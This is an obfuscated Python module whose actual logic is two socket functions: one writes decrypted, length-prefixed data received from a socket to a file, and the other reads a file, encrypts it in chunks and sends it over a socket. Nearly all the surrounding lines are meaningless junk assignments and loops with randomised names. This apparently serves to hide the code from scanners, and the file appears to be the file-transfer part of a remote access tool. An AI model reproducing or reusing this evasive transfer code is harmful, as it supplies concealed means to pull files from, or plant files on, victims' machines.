# -*- coding: utf-8 -*-

try:
    rjXdfiumoYuDydzjHdrOYcRvRdGLYARU = 'OWgAmvLpbnHWvWLiflUDYlNarvWnpDLe'
    pdOQmVNHGOcGMGgKSilgPKJgndqfMxIW = 'qaHjOKzuMaOBREiUAQMropiiFQaDRVDL'
    IUnTjnqAubVHlYKkqnyDfXFQzukjflRK = 'IzhpBypvCbGPeTRtwCToRhVhUYcpYmrQ'
    AqoGAcHcIqZCzqlFxcDayBcWnJsZtsSb = 'haIarXTPoLVCUjwJQBhaPGSvRGnqgGCQ'
    BRLxpKbRLsYxRkntRzeASObXdXxSREPD = 'NtbfvXOMuflzPtxsgpLgOHKRHuzfHpXW'
    JbfVHBmeJJciUmqhiYOlspPJLiSFYaCT = 'IwmSmJiIjBuuWfAPoPWRTiVrBgwhXPhW'
    inhXwqtyoxMpQXThFBnFRjEOAHcWocPs = [
            'OWgAmvLpbnHWvWLiflUDYlNarvWnpDLe',
            'IzhpBypvCbGPeTRtwCToRhVhUYcpYmrQ',
            'NtbfvXOMuflzPtxsgpLgOHKRHuzfHpXW',
            'chLYtHjnhMdpeYsYakozDiOUhuMBFGby'
    ]
    for rjXdfiumoYuDydzjHdrOYcRvRdGLYARU in JbfVHBmeJJciUmqhiYOlspPJLiSFYaCT:
        for pdOQmVNHGOcGMGgKSilgPKJgndqfMxIW in IUnTjnqAubVHlYKkqnyDfXFQzukjflRK:
            if AqoGAcHcIqZCzqlFxcDayBcWnJsZtsSb == BRLxpKbRLsYxRkntRzeASObXdXxSREPD:
                pdOQmVNHGOcGMGgKSilgPKJgndqfMxIW = rjXdfiumoYuDydzjHdrOYcRvRdGLYARU
            elif BRLxpKbRLsYxRkntRzeASObXdXxSREPD == pdOQmVNHGOcGMGgKSilgPKJgndqfMxIW:
                pdOQmVNHGOcGMGgKSilgPKJgndqfMxIW = JbfVHBmeJJciUmqhiYOlspPJLiSFYaCT
            else:
                BRLxpKbRLsYxRkntRzeASObXdXxSREPD = JbfVHBmeJJciUmqhiYOlspPJLiSFYaCT
                for pdOQmVNHGOcGMGgKSilgPKJgndqfMxIW in inhXwqtyoxMpQXThFBnFRjEOAHcWocPs:
                    IUnTjnqAubVHlYKkqnyDfXFQzukjflRK = pdOQmVNHGOcGMGgKSilgPKJgndqfMxIW
except Exception:
    pass
import socket

aZUURtaILFiCcVCOHnbikMRogcNbPKFB = 'fLBWFLtqQbsYLOrEbKmtLjYjkOGjrkdC'
FVKqMhuuBNfmnPmOvfiKWbpuvdIIlIjG = 'hpZFltMsdqkrlZsKgTFIwMuVxjjCLYXi'
oOqKxPdCjYvtzTTTWPJLaPkfWxmQIimv = 'cSgXLoxIofOIAycUUrPSypYKCMRcqert'
iBObilJIAuVoAjWvsbcjigKgcwFQjWnJ = 'jOOeFqWELeBJQRnbGZvTifUswnHjtybG'
iZNCFqMcbcGnNtUqdBWANHHpkUeLbQCB = 'okQERItrGFsEElqyCtagXQeEZuhpLrZc'
CXwcfPREtyLUCyHWTmLtxzXTXrMrPTXS = 'wMdmXAJfODZGngiNkzapGeYaTkQRTUuR'
if aZUURtaILFiCcVCOHnbikMRogcNbPKFB != iBObilJIAuVoAjWvsbcjigKgcwFQjWnJ:
    FVKqMhuuBNfmnPmOvfiKWbpuvdIIlIjG = oOqKxPdCjYvtzTTTWPJLaPkfWxmQIimv
    for CXwcfPREtyLUCyHWTmLtxzXTXrMrPTXS in iBObilJIAuVoAjWvsbcjigKgcwFQjWnJ:
        if CXwcfPREtyLUCyHWTmLtxzXTXrMrPTXS != oOqKxPdCjYvtzTTTWPJLaPkfWxmQIimv:
            FVKqMhuuBNfmnPmOvfiKWbpuvdIIlIjG = FVKqMhuuBNfmnPmOvfiKWbpuvdIIlIjG
        else:
            iZNCFqMcbcGnNtUqdBWANHHpkUeLbQCB = aZUURtaILFiCcVCOHnbikMRogcNbPKFB
else:
    oOqKxPdCjYvtzTTTWPJLaPkfWxmQIimv = aZUURtaILFiCcVCOHnbikMRogcNbPKFB
    aZUURtaILFiCcVCOHnbikMRogcNbPKFB = iZNCFqMcbcGnNtUqdBWANHHpkUeLbQCB
    if oOqKxPdCjYvtzTTTWPJLaPkfWxmQIimv == aZUURtaILFiCcVCOHnbikMRogcNbPKFB:
        for CXwcfPREtyLUCyHWTmLtxzXTXrMrPTXS in aZUURtaILFiCcVCOHnbikMRogcNbPKFB:
            if CXwcfPREtyLUCyHWTmLtxzXTXrMrPTXS == oOqKxPdCjYvtzTTTWPJLaPkfWxmQIimv:
                oOqKxPdCjYvtzTTTWPJLaPkfWxmQIimv = aZUURtaILFiCcVCOHnbikMRogcNbPKFB
            else:
                oOqKxPdCjYvtzTTTWPJLaPkfWxmQIimv = iZNCFqMcbcGnNtUqdBWANHHpkUeLbQCB
import struct

mhoBGrlHuwwMzxFyrqqDywLgSCQtijOl = 'trPYxfJOFxerLkhMPMXiWGHerGWCFjRf'
gnxamVavWgasVSKsDebVCHllUuFmdAtH = 'QGVbGlYzoNAuHZrbSzHnEfHbkCjcqKzY'
vVBLGCljgEYdLLxkjCRhZcrvSsmTAeEd = 'rdUoToWDlRklwHcFMpwNlYAfpaTrvUMS'
kvkSZklKPsvaElcvSzkjDmwUMTGssOal = 'lhSneRvTuqTDvAwIJwrCkyQLNiBRldtp'
HeyLTruTZzZRdBIpbQqrGaeXqtuegohi = 'YOOIJKjFJOCdILtfDTycYtxwdeDUdYtp'
pnTYsszZRnlPyRAzwHgkcEiXkOZtZkZi = 'vfDbbaDHLLZHTbiDSmKqhDcxDGNgwDDA'
if mhoBGrlHuwwMzxFyrqqDywLgSCQtijOl != kvkSZklKPsvaElcvSzkjDmwUMTGssOal:
    gnxamVavWgasVSKsDebVCHllUuFmdAtH = vVBLGCljgEYdLLxkjCRhZcrvSsmTAeEd
    for pnTYsszZRnlPyRAzwHgkcEiXkOZtZkZi in kvkSZklKPsvaElcvSzkjDmwUMTGssOal:
        if pnTYsszZRnlPyRAzwHgkcEiXkOZtZkZi != vVBLGCljgEYdLLxkjCRhZcrvSsmTAeEd:
            gnxamVavWgasVSKsDebVCHllUuFmdAtH = gnxamVavWgasVSKsDebVCHllUuFmdAtH
        else:
            HeyLTruTZzZRdBIpbQqrGaeXqtuegohi = mhoBGrlHuwwMzxFyrqqDywLgSCQtijOl
else:
    vVBLGCljgEYdLLxkjCRhZcrvSsmTAeEd = mhoBGrlHuwwMzxFyrqqDywLgSCQtijOl
    mhoBGrlHuwwMzxFyrqqDywLgSCQtijOl = HeyLTruTZzZRdBIpbQqrGaeXqtuegohi
    if vVBLGCljgEYdLLxkjCRhZcrvSsmTAeEd == mhoBGrlHuwwMzxFyrqqDywLgSCQtijOl:
        for pnTYsszZRnlPyRAzwHgkcEiXkOZtZkZi in mhoBGrlHuwwMzxFyrqqDywLgSCQtijOl:
            if pnTYsszZRnlPyRAzwHgkcEiXkOZtZkZi == vVBLGCljgEYdLLxkjCRhZcrvSsmTAeEd:
                vVBLGCljgEYdLLxkjCRhZcrvSsmTAeEd = mhoBGrlHuwwMzxFyrqqDywLgSCQtijOl
            else:
                vVBLGCljgEYdLLxkjCRhZcrvSsmTAeEd = HeyLTruTZzZRdBIpbQqrGaeXqtuegohi
from nRCQFariepVHzPRgWueSCcSNIpMrGeVq import PAMNmxJnmkQDYgiKaSUrJWZEsURKKAib

qMFXKCDcsAMJVQLWIxyAdtDOwHzBOvEJ = 'MhRgJQtmOcBrKIiBdmuayhfWufcvHMmO'
idXcsFuKttzeWVdmuBTrtJPdAYFlEDpV = 'LurqQusyyJXIuTXSsATPHTeQdzCVwrNw'
QKABtdairFeNiJIjzDOsqMFrkmKTbCdX = 'jmbBncwfAZNoUxQsvnLkUxvunENvNDMV'
JKJCRGZhQWuXYEsVoDVGxEPTQANGFIDH = 'NOlRWlpdDdEqxrPRIFNSZAWwlLUwufQg'
MqnLMvBJWSKhvConlSjysHDtrouAaqdz = 'JTvprHkdVHmKvZvnhOubbtkiKkgmVDsJ'
if qMFXKCDcsAMJVQLWIxyAdtDOwHzBOvEJ in idXcsFuKttzeWVdmuBTrtJPdAYFlEDpV:
    qMFXKCDcsAMJVQLWIxyAdtDOwHzBOvEJ = MqnLMvBJWSKhvConlSjysHDtrouAaqdz
    if idXcsFuKttzeWVdmuBTrtJPdAYFlEDpV in QKABtdairFeNiJIjzDOsqMFrkmKTbCdX:
        idXcsFuKttzeWVdmuBTrtJPdAYFlEDpV = JKJCRGZhQWuXYEsVoDVGxEPTQANGFIDH
elif idXcsFuKttzeWVdmuBTrtJPdAYFlEDpV in qMFXKCDcsAMJVQLWIxyAdtDOwHzBOvEJ:
    QKABtdairFeNiJIjzDOsqMFrkmKTbCdX = idXcsFuKttzeWVdmuBTrtJPdAYFlEDpV
    if QKABtdairFeNiJIjzDOsqMFrkmKTbCdX in idXcsFuKttzeWVdmuBTrtJPdAYFlEDpV:
        idXcsFuKttzeWVdmuBTrtJPdAYFlEDpV = MqnLMvBJWSKhvConlSjysHDtrouAaqdz
from nRCQFariepVHzPRgWueSCcSNIpMrGeVq import VZGbVmtqTmDOEQHhKIeKvmdxXyGUEXLA

BDVsFFjOYRBZqGYxpYPXWOrZmtEQwgsn = 'fHxmCNIqPBoYnjzeZEjoVmgaDzETkIuh'
fzcisYzwkiuVkqWfvmEybrXbQUKBXZsT = 'xcvPSuPlSgBnDkdfeRqFGCfoZxxxNBEb'
if BDVsFFjOYRBZqGYxpYPXWOrZmtEQwgsn != fzcisYzwkiuVkqWfvmEybrXbQUKBXZsT:
    BDVsFFjOYRBZqGYxpYPXWOrZmtEQwgsn = 'xcvPSuPlSgBnDkdfeRqFGCfoZxxxNBEb'
    fzcisYzwkiuVkqWfvmEybrXbQUKBXZsT = BDVsFFjOYRBZqGYxpYPXWOrZmtEQwgsn
    BDVsFFjOYRBZqGYxpYPXWOrZmtEQwgsn = 'fHxmCNIqPBoYnjzeZEjoVmgaDzETkIuh'
def UKljRqYmyRjdhxzdwCmbaZADNXeYjPzg(sock, WUetfBAbhvHorsheRaCajunshIBsTtEY, key):
    with open(WUetfBAbhvHorsheRaCajunshIBsTtEY, 'wb') as f:

        XTVcacDEhIuhxratOJoYGWSswsSPmbCi = 'KlhfhAbtnbJTDGstixjIoowYnjUIADpU'
        MuLLjIdjTGyJjAemGdXUXTPXUzRyeXrB = 'aNBiVSnUqmqEujGEPZOsHhiRnuIVvKgH'
        TJPKHDESUePumUsxAUOClcaPhskbVQak = 'HGdMkptmffJHLALKaqcMLGGWAmUTHgZC'
        LDWWZAUAXeEftlRgWgQFjMbLdaPyiTuS = 'xkjPdUrsSTPLLUIFoPcYIQBaDAXtVGcj'
        VMBhpFXTEufurkzcbOdXsDgHlfjblVoe = 'tEwnNsePLzGCHPORaswziQpkBLjmKsNF'
        if XTVcacDEhIuhxratOJoYGWSswsSPmbCi in MuLLjIdjTGyJjAemGdXUXTPXUzRyeXrB:
            XTVcacDEhIuhxratOJoYGWSswsSPmbCi = VMBhpFXTEufurkzcbOdXsDgHlfjblVoe
            if MuLLjIdjTGyJjAemGdXUXTPXUzRyeXrB in TJPKHDESUePumUsxAUOClcaPhskbVQak:
                MuLLjIdjTGyJjAemGdXUXTPXUzRyeXrB = LDWWZAUAXeEftlRgWgQFjMbLdaPyiTuS
        elif MuLLjIdjTGyJjAemGdXUXTPXUzRyeXrB in XTVcacDEhIuhxratOJoYGWSswsSPmbCi:
            TJPKHDESUePumUsxAUOClcaPhskbVQak = MuLLjIdjTGyJjAemGdXUXTPXUzRyeXrB
            if TJPKHDESUePumUsxAUOClcaPhskbVQak in MuLLjIdjTGyJjAemGdXUXTPXUzRyeXrB:
                MuLLjIdjTGyJjAemGdXUXTPXUzRyeXrB = VMBhpFXTEufurkzcbOdXsDgHlfjblVoe
        MzSGdDgQSNKKYNbgMXZeKLrOnAKgKkfv = struct.unpack("!I", sock.recv(4))[0]
        while MzSGdDgQSNKKYNbgMXZeKLrOnAKgKkfv:

            XwALrAkzkmSptCvTFnnReXqOqEVQIZfj = 'cJXXXdCkeniHfEnNUWLlVSUDOzwwFZAx'
            hTrIvXvnSNeDLtabnMZtIUfvQmwZaafg = 'nQvCIPYJcZJcehXaNLckTDkGqbUhLLXu'
            wMXGtLgposLZvYaFGInxEmQENFYogHaQ = 'PfEqDcFaFOLNDXJmaLyKkoxEHgIDHQqc'
            BXfNQKCsEdCGBqSXoYhMQqyWmTbvgHax = 'vkdHTVDlCjVIKIYDGTQZcSCBGUeqdDMu'
            eEepGkVkiSFphgpksgUcBaMrKQrpwJrn = 'nICIfXJBuKyZeRwWeHgdgwkEHdNlSdFD'
            eAWQhRwdoCIjMIPqWGjQiPEuuiuNdWnC = 'xBxiJWMyCAaGPQVVFceLyZzjYfogDwie'
            if wMXGtLgposLZvYaFGInxEmQENFYogHaQ == BXfNQKCsEdCGBqSXoYhMQqyWmTbvgHax:
                for eAWQhRwdoCIjMIPqWGjQiPEuuiuNdWnC in eEepGkVkiSFphgpksgUcBaMrKQrpwJrn:
                    if eAWQhRwdoCIjMIPqWGjQiPEuuiuNdWnC == BXfNQKCsEdCGBqSXoYhMQqyWmTbvgHax:
                        eEepGkVkiSFphgpksgUcBaMrKQrpwJrn = XwALrAkzkmSptCvTFnnReXqOqEVQIZfj
                    else:
                        BXfNQKCsEdCGBqSXoYhMQqyWmTbvgHax = hTrIvXvnSNeDLtabnMZtIUfvQmwZaafg
            eiNsFEjOxzjKrAXrIkmWEcUtwaGehidw = sock.recv(MzSGdDgQSNKKYNbgMXZeKLrOnAKgKkfv)
            f.write(VZGbVmtqTmDOEQHhKIeKvmdxXyGUEXLA(eiNsFEjOxzjKrAXrIkmWEcUtwaGehidw, key))
            MzSGdDgQSNKKYNbgMXZeKLrOnAKgKkfv = struct.unpack("!I", sock.recv(4))[0]
def ehRKSVQWUJyNRXJlOKfRDOvOWCanPXzl(sock, WUetfBAbhvHorsheRaCajunshIBsTtEY, key):
    with open(WUetfBAbhvHorsheRaCajunshIBsTtEY, 'rb') as f:

        akhcPgKiJEVDoZSLQdYyQpJKfHvguCjs = 'kyKyHcuGSdApLQQQNYuwKNEwCszmHkDK'
        xDwqXMlOqbywOeAhSEzXItkIyDyHriIQ = 'FEFIkxawMYDdolkxqxzBkdeJMyiYNahI'
        if akhcPgKiJEVDoZSLQdYyQpJKfHvguCjs != xDwqXMlOqbywOeAhSEzXItkIyDyHriIQ:
            akhcPgKiJEVDoZSLQdYyQpJKfHvguCjs = 'FEFIkxawMYDdolkxqxzBkdeJMyiYNahI'
            xDwqXMlOqbywOeAhSEzXItkIyDyHriIQ = akhcPgKiJEVDoZSLQdYyQpJKfHvguCjs
            akhcPgKiJEVDoZSLQdYyQpJKfHvguCjs = 'kyKyHcuGSdApLQQQNYuwKNEwCszmHkDK'
        eiNsFEjOxzjKrAXrIkmWEcUtwaGehidw = f.read(4096)
        while len(eiNsFEjOxzjKrAXrIkmWEcUtwaGehidw):

            xTYXWgIPuSaHzOvKZwhgCxyFgvZqMqXk = 'jsZtOcEvJYHyILOjUUvOJNjKblpKkZYS'
            wLQNqwuMTExDjnPMXPziofFTWEQeUMlZ = 'rctIzmshkKLHYFoiKmuqoZLvtlkfiwij'
            GcyGHtbTWwWlKAnOndjapzOhKnZanPFk = 'QdWsuJRQnLlTJiyuCzCffEKjUXLsUEQl'
            GGNXwfQlSsaebytfrqtHsbjKZrCKQgvu = 'hnaLWvpmamvxRUliipoHYvXjXgnkAupw'
            STtQlpubJLiwOYRNOSekhqqrZRNzHCAD = 'uktOablUkpKdtudEAdIMeyyrsYAbbABJ'
            yOPBEpaCMAtPpOoeMEAyJnLIsGpQaUqd = 'xFecqhdGDQeJdiNrwyDmOVhVhwUXIzVo'
            if xTYXWgIPuSaHzOvKZwhgCxyFgvZqMqXk != GGNXwfQlSsaebytfrqtHsbjKZrCKQgvu:
                wLQNqwuMTExDjnPMXPziofFTWEQeUMlZ = GcyGHtbTWwWlKAnOndjapzOhKnZanPFk
                for yOPBEpaCMAtPpOoeMEAyJnLIsGpQaUqd in GGNXwfQlSsaebytfrqtHsbjKZrCKQgvu:
                    if yOPBEpaCMAtPpOoeMEAyJnLIsGpQaUqd != GcyGHtbTWwWlKAnOndjapzOhKnZanPFk:
                        wLQNqwuMTExDjnPMXPziofFTWEQeUMlZ = wLQNqwuMTExDjnPMXPziofFTWEQeUMlZ
                    else:
                        STtQlpubJLiwOYRNOSekhqqrZRNzHCAD = xTYXWgIPuSaHzOvKZwhgCxyFgvZqMqXk
            else:
                GcyGHtbTWwWlKAnOndjapzOhKnZanPFk = xTYXWgIPuSaHzOvKZwhgCxyFgvZqMqXk
                xTYXWgIPuSaHzOvKZwhgCxyFgvZqMqXk = STtQlpubJLiwOYRNOSekhqqrZRNzHCAD
                if GcyGHtbTWwWlKAnOndjapzOhKnZanPFk == xTYXWgIPuSaHzOvKZwhgCxyFgvZqMqXk:
                    for yOPBEpaCMAtPpOoeMEAyJnLIsGpQaUqd in xTYXWgIPuSaHzOvKZwhgCxyFgvZqMqXk:
                        if yOPBEpaCMAtPpOoeMEAyJnLIsGpQaUqd == GcyGHtbTWwWlKAnOndjapzOhKnZanPFk:
                            GcyGHtbTWwWlKAnOndjapzOhKnZanPFk = xTYXWgIPuSaHzOvKZwhgCxyFgvZqMqXk
                        else:
                            GcyGHtbTWwWlKAnOndjapzOhKnZanPFk = STtQlpubJLiwOYRNOSekhqqrZRNzHCAD
            BfUVphxgabyJpuZgFfGvWMIulOcFAoag = PAMNmxJnmkQDYgiKaSUrJWZEsURKKAib(eiNsFEjOxzjKrAXrIkmWEcUtwaGehidw, key)
            sock.send(struct.pack("!I", len(BfUVphxgabyJpuZgFfGvWMIulOcFAoag)))
            sock.send(BfUVphxgabyJpuZgFfGvWMIulOcFAoag)
            eiNsFEjOxzjKrAXrIkmWEcUtwaGehidw = f.read(4096)
        sock.send('\x00\x00\x00\x00')
